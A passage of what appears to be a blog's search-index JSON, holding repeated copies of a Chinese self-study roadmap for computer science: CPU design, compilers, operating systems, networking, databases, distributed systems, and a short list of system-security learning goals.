语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#编译原理--编程语言"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#系统构建"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#操作系统"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#计算机网络"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 